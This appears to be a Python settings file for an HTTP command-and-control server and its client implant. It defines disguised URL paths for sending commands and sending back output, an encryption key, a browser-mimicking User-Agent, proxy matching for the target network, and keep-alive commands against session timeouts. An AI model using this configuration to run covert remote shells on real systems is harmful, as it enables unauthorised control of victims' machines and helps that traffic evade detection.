# ------------  Begin variables used in both client and c2 server code  ------------

# Port c2 server listens on
PORT = 80

# This key must be 32 characters or fewer
KEY = "U can't touch this!"

# Path to use for signifying a command request from a client using HTTP GET
CMD_REQUEST = "/book?isbn="

# Path to use for signifying command output or errors from a client using HTTP POST
RESPONSE = "/inventory"

# Path to use for signifying the current working directory from a client using HTTP POST
CWD_RESPONSE = "/title"

# POST variable name to use for assigning to command output from a client
RESPONSE_KEY = "index"

# ----------------------  Begin c2 server code only variables  ----------------------

# Leave blank for binding to all interfaces, otherwise specify c2 server's IP address
BIND_ADDR = ""

# Command input timeout setting in seconds; 225 is about right for Azure; set to NONE if not needed
# INPUT_TIMEOUT = 3
INPUT_TIMEOUT = None

# Run this command automatically to prevent Azure and other hosting environments from killing our active session
# KEEP_ALIVE_CMD = "time /T"  # Windows only
KEEP_ALIVE_CMD = "date +%R"  # Linux only

# -----------------------  Begin client code only variables  ------------------------

# Set the c2 server's IP address or hostname
C2_SERVER = "localhost"

# Define a sleep delay time in seconds for re-connection attempts
DELAY = 3

# Set proxy to None or match target network's proxy using a Python dictionary format
PROXY = None
# PROXY = {"http": "proxy.some-site.com:443"}

# Keep the User-Agent up-to-date and looking like a modern browser; Python dictionary format
HEADER = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                        "Chrome/120.0.0.0 Safari/537.36"}
